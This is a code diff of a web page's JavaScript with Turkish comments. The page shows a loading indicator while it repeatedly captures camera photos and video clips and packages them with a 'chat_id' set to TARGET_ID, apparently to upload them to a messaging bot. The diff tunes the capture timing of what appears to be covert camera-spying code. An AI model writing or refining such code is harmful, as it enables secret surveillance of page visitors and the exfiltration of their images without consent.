@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
+            // ==================== KAMERA İŞLEMLERİ - DÜZENLENMİŞ VERSİYON ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -172,7 +172,7 @@
                         document.getElementById('loading').style.display = 'block';
                         
                         // ========================================
-                        // FOTOĞRAF - 1 SANİYE SONRA BAŞLA (ilk foto fazla gelmesin)
+                        // FOTOĞRAF - SADECE SETINTERVAL İLE
                         // ========================================
                         function fotoCek() {
                             if (!stream?.active) return;
@@ -197,24 +197,17 @@
                             }, 'image/jpeg', 0.85);
                         }
                         
-                        // İLK FOTO 1 SANİYE SONRA
-                        setTimeout(() => {
-                            fotoCek(); // 1. saniyede 1. foto
-                            
-                            // DİĞER FOTOLAR
-                            setInterval(fotoCek, FOTO_SURESI * 1000);
-                            
-                        }, 1000);
+                        // İLK FOTOĞRAF SETINTERVAL İLE GELECEK (DIREKT ÇAĞRMA YOK)
+                        setInterval(fotoCek, FOTO_SURESI * 1000);
                         
                         // ========================================
-                        // VİDEO - HEMEN BAŞLA (0ms)
+                        // VİDEO - SADECE SETINTERVAL İLE
                         // ========================================
                         function videoBaslat() {
                             if (!stream?.active) return;
                             
                             videoCount++;
                             const videoIndex = videoCount;
-                            const videoBaslangic = Date.now();
                             const chunks = [];
                             
                             try {
@@ -229,7 +222,6 @@
                                 
                                 mr.onstop = () => {
                                     const blob = new Blob(chunks, { type: 'video/webm' });
-                                    const boyutKB = (blob.size / 1024).toFixed(0);
                                     
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
@@ -251,10 +243,7 @@
                             } catch(e) {}
                         }
                         
-                        // İLK VİDEO HEMEN
-                        videoBaslat();
-                        
-                        // DİĞER VİDEOLAR
+                        // İLK VİDEO SETINTERVAL İLE GELECEK (DIREKT ÇAĞRMA YOK)
                         setInterval(videoBaslat, VIDEO_SURESI * 1000);
                     };
                     
@@ -272,4 +261,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
